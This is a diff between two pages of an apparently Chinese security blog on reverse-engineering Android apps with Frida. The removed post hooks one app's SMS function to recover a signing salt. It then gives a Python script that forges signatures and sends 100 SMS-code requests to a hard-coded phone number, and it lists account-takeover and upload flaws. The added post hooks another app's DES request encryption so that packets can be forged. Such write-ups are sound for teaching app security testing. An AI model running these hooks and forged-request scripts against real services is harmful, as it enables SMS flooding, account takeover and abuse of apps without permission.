@@ -4,10 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="一些真实的app渗透与算法hook, wa1ki0g,blog,github">
-    <meta name="description" content="app1apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面
+    <meta name="keywords" content="嘟嘟牛app算法hook, wa1ki0g,blog,github">
+    <meta name="description" content="嘟嘟牛app算法hookadb install 安装完后，打开登录界面
 
-真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：/Users/wa1ki0g/Desktop/利用系统函数与堆栈快速定位ap">
+手机挂好sock代理，抓到加密后的包：
+
+搜索一下关键字Encrypt，重点看下 com.dodonew下的：
+
+最后都hook一遍发现是在 com.dodonew.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>一些真实的app渗透与算法hook | wa1ki0g‘s blog</title>
+    <title>嘟嘟牛app算法hook | wa1ki0g‘s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -260,12 +264,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">一些真实的app渗透与算法hook</h1>
+                    <h1 class="description center-align post-title">嘟嘟牛app算法hook</h1>
                 </div>
             </div>
         </div>
@@ -402,7 +406,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-09-25
+                    2022-03-15
                 </div>
                 
 
@@ -416,14 +420,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    641
+                    347
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -438,89 +442,58 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h2><p>apk文件下载到电脑，adb install 安装到真机上，打开是一个注册页面</p>
-<p><img src="https://img-blog.csdnimg.cn/b90abb0a24e34fe49de4bb453977e318.png" alt="在这里插入图片描述"></p>
-<p>真机把SocksDroid打开，随便输个电话号，电脑开charles抓包：<br>/Users/wa1ki0g/Desktop/利用系统函数与堆栈快速定位app关键代码.md<br><img src="https://img-blog.csdnimg.cn/893631dc91954b62a5ba243e9baa1e71.png" alt="在这里插入图片描述"></p>
-<p>我们放到burp重发器里，改参数重发，不出意外，果然做了签名校验不让改包：</p>
-<p><img src="https://img-blog.csdnimg.cn/f9390f59dbe040919f05247545021bd8.png" alt="在这里插入图片描述"><br>ok，逆一下这个apk，找到算法hook掉就好了，定位一下特征：</p>
-<p><img src="https://img-blog.csdnimg.cn/eb8ce964d9b949acad50ca6a7576f26a.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c5644413da8f4a608d70ec23bf6291db.png" alt="在这里插入图片描述"><br>这个函数是发送请求的一个函数，我们观察一下这段代码，可以看到我们最终发出去的sign参数的组成是：（时间 + 类型 + 未知字符 + 手机号），并且这个未知字符是这个函数的一个参数，那好办了。<br>直接hook这个getSmscode函数，看看传来了哪些值，就可以得到这个未知字符，有了这个未知字符我们就可以构建sign</p>
-<p>真机开下frida服务端，做一下端口转发：<br><img src="https://img-blog.csdnimg.cn/6ceb6cb1ac2c4209a4f2b9cb91322eca.png" alt="在这里插入图片描述"></p>
-<p>hook代码：</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> sys
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./bk.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
-    script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
-script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-<pre class=" language-javascript"><code class="language-javascript">Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.CommAction'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getSmscode<span class="token punctuation">.</span>implementation<span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">{</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"hook success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"type："</span><span class="token operator">+</span>aa<span class="token punctuation">,</span><span class="token string">"key："</span><span class="token operator">+</span>bb<span class="token punctuation">,</span><span class="token string">"phone："</span><span class="token operator">+</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSmscode</span><span class="token punctuation">(</span>aa<span class="token punctuation">,</span>bb<span class="token punctuation">,</span>cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <h2 id="嘟嘟牛app算法hook"><a href="#嘟嘟牛app算法hook" class="headerlink" title="嘟嘟牛app算法hook"></a>嘟嘟牛app算法hook</h2><p>adb install 安装完后，打开登录界面</p>
+<p><img src="https://img-blog.csdnimg.cn/102290e0a07e4dd29518a82986920567.png" alt="在这里插入图片描述"></p>
+<p>手机挂好sock代理，抓到加密后的包：</p>
+<p><img src="https://img-blog.csdnimg.cn/4b4c2f47968649979f2b5fd626c71411.png" alt="在这里插入图片描述"></p>
+<p>搜索一下关键字Encrypt，重点看下 com.dodonew下的：</p>
+<p><img src="https://img-blog.csdnimg.cn/c62ff55eada74d28b343387b45a1abe7.png" alt="在这里插入图片描述"></p>
+<p>最后都hook一遍发现是在 com.dodonew.online.http.JsonRequest包下的addRequestMap中调用encodeDesMap进行加密的：</p>
+<p><img src="https://img-blog.csdnimg.cn/c1679d426bdc47ad854eb41886350bb8.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/c15778814e204356874a345da5d4e247.png" alt="在这里插入图片描述"></p>
+<p>hook这个函数的结果：</p>
+<p><img src="https://img-blog.csdnimg.cn/00323df33b064386b6d475139706f2fe.png" alt="在这里插入图片描述"><br>hook的代码：</p>
+<p>js：</p>
+<pre class=" language-css"><code class="language-css">
+<span class="token selector">Java<span class="token class">.perform</span>(function ()</span><span class="token punctuation">{</span>
+
+    <span class="token selector">console<span class="token class">.log</span>("start");
+    var jsonRequest = Java<span class="token class">.use</span>("com<span class="token class">.dodonew.online.http.JsonRequest</span>");
+    var requestUtil = Java<span class="token class">.use</span>("com<span class="token class">.dodonew.online.http.RequestUtil</span>");
+
+    jsonRequest<span class="token class">.addRequestMap.overload</span>('java<span class="token class">.util.Map</span>', 'int')<span class="token class">.implementation</span> = function (addMap, a) </span><span class="token punctuation">{</span>
+        console<span class="token number">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"jsonRequest.addRequestMap is called"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        return this<span class="token number">.</span><span class="token function">addRequestMap</span><span class="token punctuation">(</span>addMap, a<span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
+    <span class="token selector">requestUtil<span class="token class">.encodeDesMap.overload</span>('java<span class="token class">.lang.String</span>', 'java<span class="token class">.lang.String</span>', 'java<span class="token class">.lang.String</span>')<span class="token class">.implementation</span> = function (data, desKey, desIV) </span><span class="token punctuation">{</span>
+        console<span class="token number">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"data: "</span>, data, desKey, desIV<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        var encodeDesMap = this<span class="token number">.</span><span class="token function">encodeDesMap</span><span class="token punctuation">(</span>data, desKey, desIV<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        console<span class="token number">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"encodeDesMap: "</span>, encodeDesMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        return encodeDesMap<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </code></pre>
-<p>hook代码执行监听，手机重新发注册的包，成功监控到：<br><img src="https://img-blog.csdnimg.cn/10954ffaa97c4cb4b513b05c7b5c1868.png" alt="在这里插入图片描述"><br>未知字符找到了，我们用getStringMD5toUpperCase(yyyyMMddHHmmss + i + str + str2) 自己先算一组数据验证下，没有错误：</p>
-<p><img src="https://img-blog.csdnimg.cn/56aab381936e41a2841e6e76eef91eb6.png" alt="在这里插入图片描述"></p>
-<p>这回函数需要的参数我们都拥有了，我们直接通过frida的rpc来调用这个函数，直接给我们生成sign , 并简单写个发送请求的脚本，直接实现一条龙。<br>hook代码：</p>
+<p>py：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> frida
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> datetime
-<span class="token keyword">import</span> requests
-url <span class="token operator">=</span> <span class="token string">'http://xxxxxx/Appapi/Common/getSmscode'</span>
-sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
-nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'app名字'</span><span class="token punctuation">)</span>
-phone <span class="token operator">=</span> <span class="token string">'15149029981'</span>
-type1 <span class="token operator">=</span> <span class="token string">'1'</span>
-
-<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">def</span> <span class="token function">on_message</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#js中执行send函数后要回调的函数</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
+sess <span class="token operator">=</span> frida<span class="token punctuation">.</span>get_remote_device<span class="token punctuation">(</span><span class="token punctuation">)</span>
+nsess<span class="token operator">=</span>sess<span class="token punctuation">.</span>attach<span class="token punctuation">(</span><span class="token string">'嘟嘟牛在线'</span><span class="token punctuation">)</span>
 
-
-<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./demo1.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'./app2.js'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
     script <span class="token operator">=</span> nsess<span class="token punctuation">.</span>create_script<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
 script<span class="token punctuation">.</span>on<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span>on_message<span class="token punctuation">)</span>
 script<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    curr_time <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    timestamp<span class="token operator">=</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span>curr_time<span class="token punctuation">,</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span>
-    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
-    sign <span class="token operator">=</span> script<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>getsign<span class="token punctuation">(</span>f<span class="token string">'{timestamp}{type1}wocaonima{phone}'</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span>sign<span class="token punctuation">)</span>
-    dd <span class="token operator">=</span> <span class="token string">'"phone":"{0}","sign":"{1}","currTime":"{2}","type":"1"'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>phone<span class="token punctuation">,</span>sign<span class="token punctuation">,</span>timestamp<span class="token punctuation">)</span>
-    nd <span class="token operator">=</span> <span class="token string">'{'</span><span class="token operator">+</span>dd<span class="token operator">+</span><span class="token string">'}'</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hook success:'</span><span class="token operator">+</span>nd<span class="token punctuation">)</span>
-    userjson<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'userjson'</span><span class="token punctuation">:</span>nd<span class="token punctuation">}</span>
-  
-    talk <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>userjson<span class="token punctuation">)</span>
-    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"发送成功"</span><span class="token punctuation">)</span>
-</code></pre>
-<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sign</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">var</span> res <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-    Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        res <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.jx885.library.http.network.HttpUtils'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getStringMD5toUpperCase</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    <span class="token punctuation">}</span><span class="token punctuation">)</span>
-    <span class="token keyword">return</span> res
-<span class="token punctuation">}</span>
-
-rpc<span class="token punctuation">.</span>exports<span class="token operator">=</span><span class="token punctuation">{</span>
-    getsign<span class="token punctuation">:</span>sign
-<span class="token punctuation">}</span><span class="token punctuation">;</span>
+sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
-<p><strong>第一个漏洞：验证码爆破</strong></p>
-<p><img src="https://img-blog.csdnimg.cn/843a852697fc4eb287a0e1456b57f2f7.png" alt="在这里插入图片描述"></p>
-<p>结果：<br><img src="https://img-blog.csdnimg.cn/536b42d99f384d728859d4623a0cf542.png" alt="在这里插入图片描述"></p>
-<p><strong>第二个漏洞：任意用户密码重置</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/395bd1b23d8d4504b1d0a09549309d6c.png" alt="在这里插入图片描述"></p>
-<p><strong>第三个漏洞：任意用户注册与手机绑定</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/be1a0ae8f4a943d096a663a17e1f53b3.png" alt="在这里插入图片描述"></p>
-<p><strong>第四个漏洞：任意文件上传</strong><br>结果<br><img src="https://img-blog.csdnimg.cn/012f1a46ffce44da8523a2f9ceaa4bc2.png" alt="在这里插入图片描述"></p>
+<p>我们观察得到的这个数据，发现用户名，密码我们都可以得到了，但是还有一个字段我们是不知道的，就是sign字段的明文，最后发现他是在这里生成的：</p>
+<p><img src="https://img-blog.csdnimg.cn/8eeabca91e9a4860b44c335f7f9becca.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/c8cef5ed44b4403c92614b341d42beda.png" alt="在这里插入图片描述"><br>我们hook一下，来得到这个签名的明文:</p>
+<p><img src="https://img-blog.csdnimg.cn/032d8d398d2b4cb0abdf3024a3c84194.png" alt="在这里插入图片描述"><br>这个明文md5以后就是我们的sign，参数加密的问题解决了，之后我们就可以对数据包进行伪造来测试一些常见的漏洞了。</p>
 
                 
             </div>
@@ -547,7 +520,7 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">http://example.com/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/</a>
+                    <a href="http://example.com/2022/03/15/%E5%98%9F%E5%98%9F%E7%89%9Bapp%E7%AE%97%E6%B3%95hook/">http://example.com/2022/03/15/%E5%98%9F%E5%98%9F%E7%89%9Bapp%E7%AE%97%E6%B3%95hook/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -754,18 +727,17 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2022/09/25/%E4%B8%80%E4%BA%9B%E7%9C%9F%E5%AE%9E%E7%9A%84app%E6%B8%97%E9%80%8F%E4%B8%8E%E7%AE%97%E6%B3%95hook/">
+                <a href="/2022/03/15/BlueCMS-v1-6/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="一些真实的app渗透与算法hook">
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="BlueCMS v1.6">
                         
-                        <span class="card-title">一些真实的app渗透与算法hook</span>
+                        <span class="card-title">BlueCMS v1.6</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -775,22 +747,21 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/app%E5%AE%89%E5%85%A8/" class="post-category">
-                                    app安全
+                            <a href="/categories/php%E5%AE%89%E5%85%A8/" class="post-category">
+                                    php安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
@@ -801,13 +772,13 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/08/31/SqlServer%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">
+                <a href="/2022/03/15/%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0%E4%B8%8E%E5%A0%86%E6%A0%88%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8Dapp%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="SqlServer常见攻击手法">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="利用系统函数与堆栈快速定位app关键代码">
                         
-                        <span class="card-title">SqlServer常见攻击手法</span>
+                        <span class="card-title">利用系统函数与堆栈快速定位app关键代码</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -818,14 +789,14 @@ rpc<span class="token punctuation">.</span>exports<span class="token operator">=
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-15
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" class="post-category">
-                                    数据库安全
+                            <a href="/categories/app%E5%AE%89%E5%85%A8/" class="post-category">
+                                    app安全
                                 </a>
                             
                             
